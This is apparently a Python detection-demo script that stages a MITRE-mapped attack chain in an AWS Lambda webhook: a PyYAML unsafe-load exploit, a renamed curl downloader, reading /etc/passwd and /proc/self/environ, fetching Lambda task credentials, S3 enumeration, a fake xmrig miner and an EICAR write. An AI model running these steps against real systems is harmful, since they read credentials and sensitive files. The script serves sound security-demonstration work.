"""Serverless kill chain — AWS Lambda order-webhook (MITRE ATT&CK; API + CloudTrail lane)."""
from __future__ import annotations

import json
import os
import shutil
import socket
import subprocess
from pathlib import Path
from typing import Any

WORKSHOP_MARKER = Path("/tmp/jss-order-yaml-chain.txt")
RENAMED_DOWNLOADER = Path("/tmp/.wget")
MINER_BINARY = Path("/tmp/xmrig")
EICAR_PATH = Path("/tmp/eicar.com")
EICAR = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
DEFAULT_YAML_PAYLOAD = "!!python/object/apply:builtins.eval\nargs: ['\"exploited\"']"
SENSITIVE_PATHS = ("/etc/passwd", "/etc/hosts", "/proc/self/environ")
MINER_DNS = ("pool.supportxmr.com", "xmr.pool.minergate.com")
ECS_CREDENTIALS_HOST = "169.254.170.2"


def _run_proc(cmd: list[str], timeout: float = 12, input_text: str | None = None) -> dict[str, Any]:
    try:
        proc = subprocess.run(
            cmd,
            input=input_text,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return {
            "command": cmd,
            "returncode": proc.returncode,
            "stdout": proc.stdout.strip(),
            "stderr": proc.stderr.strip(),
        }
    except Exception as exc:
        return {"command": cmd, "returncode": None, "error": str(exc)}


def poisoned_manifest(body: dict) -> str | None:
    manifest = body.get("fulfillmentManifest") or body.get("shippingConfigYaml")
    if isinstance(manifest, str) and manifest.strip():
        return manifest
    return None


def exploit_yaml(payload: str) -> dict[str, Any]:
    import yaml

    try:
        result = yaml.load(payload, Loader=yaml.Loader)
        exploited = result == "exploited" or result is not None
        return {"success": True, "exploited": exploited, "result": str(result)}
    except Exception as exc:
        return {"success": False, "exploited": False, "error": str(exc)}


def _renamed_downloader() -> dict[str, Any]:
    curl_path = shutil.which("curl") or "/usr/bin/curl"
    output_path = Path("/tmp/jss-serverless-downloader.out")
    steps = [
        _run_proc(["cp", curl_path, str(RENAMED_DOWNLOADER)]),
        _run_proc(["chmod", "755", str(RENAMED_DOWNLOADER)]),
        _run_proc(
            [
                str(RENAMED_DOWNLOADER),
                "-fsSL",
                "--max-time",
                "8",
                "https://checkip.amazonaws.com",
                "-o",
                str(output_path),
            ],
            timeout=12,
        ),
    ]
    return {
        "downloader_path": str(RENAMED_DOWNLOADER),
        "output_path": str(output_path),
        "steps": steps,
        "downloaded": output_path.exists() and output_path.stat().st_size > 0,
    }


def _sensitive_file_cat() -> dict[str, Any]:
    steps = []
    for path in SENSITIVE_PATHS:
        step = _run_proc(["cat", path])
        step["path"] = path
        steps.append(step)
    return {
        "steps": steps,
        "paths_read": sum(1 for s in steps if s.get("returncode") == 0),
    }


def _lambda_credentials_probe() -> dict[str, Any]:
    """Lambda / Fargate-style task credentials when relative URI is present."""
    rel = os.getenv("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI", "")
    curl_probe = None
    creds_preview = None
    if rel:
        url = f"http://{ECS_CREDENTIALS_HOST}{rel}"
        curl_probe = _run_proc(
            ["curl", "-s", "-H", "Metadata-Flavor: Amazon", url],
            timeout=8,
        )
        if curl_probe.get("stdout"):
            try:
                payload = json.loads(curl_probe["stdout"])
                creds_preview = {
                    "AccessKeyId": (payload.get("AccessKeyId") or "")[:8] + "...",
                    "RoleArn": payload.get("RoleArn"),
                    "Token_preview": "redacted",
                }
            except json.JSONDecodeError:
                creds_preview = {"parse_error": True}

    identity: dict[str, Any] = {}
    error = None
    try:
        import boto3

        identity = boto3.client("sts").get_caller_identity()
    except Exception as exc:
        error = str(exc)

    subprocess_probe = _run_proc(
        [
            "python3",
            "-c",
            "import boto3; print(boto3.client('sts').get_caller_identity())",
        ]
    )
    return {
        "credentials_relative_uri": rel or None,
        "curl_task_credentials": curl_probe,
        "credentials_preview": creds_preview,
        "sts_identity": identity,
        "subprocess_sts_probe": subprocess_probe,
        "error": error,
        "upwind": ["CloudTrail identity", "AWS credentials access", "API custom rules"],
    }


def _s3_enumeration() -> dict[str, Any]:
    buckets: list[str] = []
    error = None
    try:
        import boto3

        response = boto3.client("s3").list_buckets()
        buckets = [item["Name"] for item in response.get("Buckets", [])[:8]]
    except Exception as exc:
        error = str(exc)

    return {
        "region": os.getenv("AWS_REGION") or os.getenv("AWS_DEFAULT_REGION"),
        "buckets": buckets,
        "error": error,
        "upwind": ["CloudTrail S3 ListBuckets", "data exfiltration"],
    }


def _cryptominer_sim() -> dict[str, Any]:
    dns_results: list[dict[str, Any]] = []
    for domain in MINER_DNS:
        entry: dict[str, Any] = {"domain": domain, "resolved": []}
        try:
            entry["resolved"] = list(
                {ai[4][0] for ai in socket.getaddrinfo(domain, 443, proto=socket.IPPROTO_TCP)}
            )
        except socket.gaierror as exc:
            entry["error"] = str(exc)
        dns_results.append(entry)

    sleep_src = shutil.which("sleep") or "/bin/sleep"
    steps = [
        _run_proc(["cp", sleep_src, str(MINER_BINARY)]),
        _run_proc(["chmod", "755", str(MINER_BINARY)]),
        _run_proc([str(MINER_BINARY), "2"]),
    ]
    return {
        "miner_path": str(MINER_BINARY),
        "process_steps": steps,
        "dns_probes": dns_results,
        "warning": "Synthetic only — sleep binary renamed to xmrig; no real mining",
        "upwind": ["Crypto mining threats (CloudWatch if instrumented)", "CryptoMiners Services DNS"],
    }


def _eicar_file_write() -> dict[str, Any]:
    tee_step = _run_proc(["tee", str(EICAR_PATH)], input_text=EICAR + "\n")
    EICAR_PATH.write_text(EICAR, encoding="utf-8")
    cat_step = _run_proc(["cat", str(EICAR_PATH)])
    return {
        "path": str(EICAR_PATH),
        "tee_process": tee_step,
        "cat_process": cat_step,
        "written": EICAR_PATH.exists(),
        "length": len(EICAR) if EICAR_PATH.exists() else 0,
        "upwind": ["Malware protection (package scan)", "CloudWatch process logs"],
    }


def run_checkout_chain(manifest: str) -> dict[str, Any]:
    chain: list[dict[str, Any]] = []

    chain.append(
        {
            "step": 0,
            "mitre": ["T1190"],
            "tactic": "Initial Access",
            "action": "exploit_public_api_gateway_checkout",
            "pattern": "unauthenticated_execute_api",
            "note": "Primary signal: API custom rule on POST /checkout body; API Gateway has no authorizer",
            "upwind": ["API custom rules", "Unauthorized API", "CloudTrail API Gateway"],
        }
    )

    yaml_result = exploit_yaml(manifest)
    chain.append(
        {
            "step": 1,
            "mitre": ["T1203"],
            "tactic": "Execution",
            "action": "yaml.load fulfillmentManifest in handle_checkout",
            "cve": "CVE-2020-14343",
            "pattern": "unsafe_deserialization",
            **yaml_result,
            "upwind": ["CVE-2020-14343 / unsafe deserialization"],
        }
    )

    id_step = _run_proc(["id", "-a"])
    marker_text = f"yaml-chain:{yaml_result.get('result')}\n{id_step.get('stdout', '')}\n"
    WORKSHOP_MARKER.write_text(marker_text, encoding="utf-8")
    chain.append(
        {
            "step": 2,
            "mitre": ["T1059.004"],
            "tactic": "Execution",
            "action": "post_exploit_identity_probe",
            "process": id_step,
            "marker_file": str(WORKSHOP_MARKER),
            "upwind": ["CloudWatch Logs process output", "Custom API + Process if tracer added"],
        }
    )

    shell_pipe = _run_proc(["sh", "-c", f"id 2>&1 | tee -a {WORKSHOP_MARKER}"])
    chain.append(
        {
            "step": 3,
            "mitre": ["T1059.004"],
            "tactic": "Execution",
            "action": "shell_pipe_redirect",
            "process": shell_pipe,
            "upwind": ["Shell spawn in Lambda", "CloudWatch"],
        }
    )

    renamed = _renamed_downloader()
    chain.append(
        {
            "step": 4,
            "mitre": ["T1027"],
            "tactic": "Defense Evasion",
            "action": "renamed_downloader_execution",
            "pattern": "cp_curl_to_hidden_path",
            **renamed,
            "upwind": ["Operating system utilities processes", "Out Of Baseline"],
        }
    )

    sensitive = _sensitive_file_cat()
    chain.append(
        {
            "step": 5,
            "mitre": ["T1005"],
            "tactic": "Collection",
            "action": "sensitive_system_file_cat",
            "pattern": "discrete_cat_passwd_proc",
            **sensitive,
            "upwind": [
                "Sensitive file access",
                "Sensitive System File Access",
                "Operating system utilities processes",
            ],
        }
    )

    creds = _lambda_credentials_probe()
    chain.append(
        {
            "step": 6,
            "mitre": ["T1552.005", "T1078"],
            "tactic": "Credential Access",
            "action": "lambda_execution_role_and_task_credentials",
            "scope": "lambda-runtime",
            **creds,
        }
    )

    chain.append(
        {
            "step": 7,
            "mitre": ["T1087", "T1619"],
            "tactic": "Discovery",
            "action": "s3_enumeration",
            "scope": "lambda-data-plane",
            **_s3_enumeration(),
        }
    )

    miner = _cryptominer_sim()
    chain.append(
        {
            "step": 8,
            "mitre": ["T1496"],
            "tactic": "Impact",
            "action": "cryptominer_simulation",
            "pattern": "xmrig_sleep_binary_dns_probe",
            **miner,
        }
    )

    eicar = _eicar_file_write()
    chain.append(
        {
            "step": 9,
            "mitre": ["T1565.001"],
            "tactic": "Impact",
            "action": "eicar_file_write",
            "pattern": "malware_test_file_tee",
            **eicar,
        }
    )

    exploited = bool(yaml_result.get("exploited"))
    return {
        "exploited": exploited,
        "pattern": "serverless_hybrid_kill_chain",
        "cve": "CVE-2020-14343",
        "scope": "order-webhook-lambda",
        "instrumentation": "api-gateway-plus-cloudtrail",
        "mitre_attack": {
            "tactics": [
                "Initial Access",
                "Execution",
                "Defense Evasion",
                "Collection",
                "Credential Access",
                "Discovery",
                "Impact",
            ],
            "techniques": [
                "T1190",
                "T1203",
                "T1059.004",
                "T1027",
                "T1005",
                "T1552.005",
                "T1078",
                "T1087",
                "T1619",
                "T1496",
                "T1565.001",
            ],
        },
        "chain": chain,
        "narrative": (
            "AWS Lambda hybrid story: public API Gateway checkout (T1190) → PyYAML RCE (T1203) → "
            "shell/id subprocess toolkit (T1059) → renamed curl downloader to checkip.amazonaws.com (T1027) → "
            "sensitive cat (T1005) → STS/task credentials (T1552/T1078) → S3 ListBuckets (T1619) → miner sim (T1496) → EICAR (T1565). "
            "Without Upwind Lambda tracer, lean on API rules + CloudTrail for Detections."
        ),
        "presenter_notes": {
            "tracer_gap": "Lambda has no Upwind tracer in image — Process steps land in CloudWatch; Detections from API + CloudTrail",
            "api_rule": "Rego: POST /checkout + fulfillmentManifest + !!python/object/apply",
            "audit_epilogue": "CloudTrail: sts:GetCallerIdentity, s3:ListBuckets from jays-surf-shop-demo-order-webhook role",
            "demo_trigger": "POST /api/security/demo/order-yaml-checkout",
            "optional_upgrade": "upwindctl lambda instrument for Process parity with Cloud Run / Azure Function",
        },
        "upwind_policies": [
            "API custom rules — poisoned checkout",
            "CloudTrail identity",
            "CloudTrail S3 ListBuckets",
            "Crypto mining threats",
            "Malware protection (deployment package)",
        ],
    }
